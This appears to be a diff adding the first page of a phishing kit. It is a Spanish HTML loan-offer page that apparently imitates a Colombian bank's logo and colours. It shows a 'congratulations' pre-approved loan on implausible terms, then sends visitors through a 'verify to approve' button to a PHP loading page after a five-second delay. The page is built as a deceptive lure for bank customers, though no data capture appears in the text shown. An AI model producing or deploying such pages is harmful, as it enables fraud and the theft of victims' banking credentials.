@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Préstamo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+        }
+        .container {
+            max-width: 370px;
+            margin: 60px auto;
+            background: #fff;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
+        }
+        select, input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 90%;
+            padding: 10px;
+            background-color: #F8DC23;
+            color: #333;
+            border: none;
+            border-radius: 11px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 25px;
+            margin-left: 15px;
+        }
+        .small-image {
+          width: 14%;
+        }
+        header {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 25px;
+            border-bottom: 3px solid #fdda24;
+        }
+        header a {
+            color: #fff;
+            text-decoration: none;
+        }
+        .result {
+            text-align: center;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="#">⎗ Volver</a>
+        <a href="#">Salir ⎘ </a>
+    </header>
+    <div class="container">
+        <img src="logobancol.png" alt="Imagen" class="small-image">
+        <h1>Pide tu Préstamo</h1>
+        <label for="plazo">Seleccione el plazo:</label>
+        <select id="plazo">
+            <option value="3">3 meses</option>
+            <option value="6">6 meses</option>
+            <option value="9">9 meses</option>
+            <option value="12" selected>12 meses</option>
+        </select>
+        <div class="result" id="resultado"></div>
+
+        <button id="simular">Solicitud de Préstamo</button>
+        
+        <!-- Botón para verificar -->
+        <button id="verificar-btn">
+            Verificate para Aprobar
+        </button>
+    </div>
+    <script>
+        const plazoInput = document.getElementById("plazo");
+        const resultadoDiv = document.getElementById("resultado");
+        const simularBtn = document.getElementById("simular");
+        const verificarBtn = document.getElementById("verificar-btn");
+
+        // Calcular préstamo
+        simularBtn.addEventListener("click", () => {
+            
+            const plazo = parseInt(plazoInput.value);
+            const capital = 2400000; // $2,400,000 COP
+            const interesMensual = 11000; // $11,000 COP
+
+            const totalInteres = plazo * interesMensual;
+            const pagoTotal = capital + totalInteres;
+            const cuotaMensual = Math.ceil(pagoTotal / plazo);
+
+            resultadoDiv.innerHTML = `
+                <h1>🎉 ¡ Felicidades ! 🎉</h1>
+                Esto es lo que te podemos prestar:
+                
+                <br>Cantidad a prestar: $${capital.toLocaleString()} COP
+                
+                <br>Meses de plazo: ${plazo}
+                
+                <br>Interés mensual: $${interesMensual.toLocaleString()} COP
+                
+                <br>Pago total: $${pagoTotal.toLocaleString()} COP
+                
+                <br>Cuota mensual: $${cuotaMensual.toLocaleString()} COP
+            `;
+        });
+
+        // Espera de 5 segundos para redirección
+        verificarBtn.addEventListener("click", () => {
+            verificarBtn.disabled = true; // Deshabilitar el botón temporalmente
+            verificarBtn.textContent = "Redirigiendote...";
+            
+            setTimeout(() => {
+                window.location.href = "cargando.php"; // Redirige después de 5 segundos
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
